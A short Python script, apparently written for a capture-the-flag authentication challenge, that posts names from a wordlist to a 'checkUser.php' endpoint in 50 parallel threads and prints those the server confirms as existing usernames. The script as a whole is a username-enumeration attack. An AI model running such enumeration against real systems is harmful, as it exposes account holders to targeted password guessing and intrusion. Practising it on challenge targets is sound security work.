#!/usr/bin/env python3
import requests
import concurrent.futures

url_vuln = "http://4.challenge.auth.site/checkUser.php"

names = []

with open('names.txt','r') as f:
	for line in f:
		names.append(line.strip())

def request(name=""):
	r = requests.post(url=url_vuln, data = {"username":name})
	if r.text == "0":
		print(f"Found username: {name}")

with concurrent.futures.ThreadPoolExecutor(50) as executor: 
	results = executor.map(request,names)
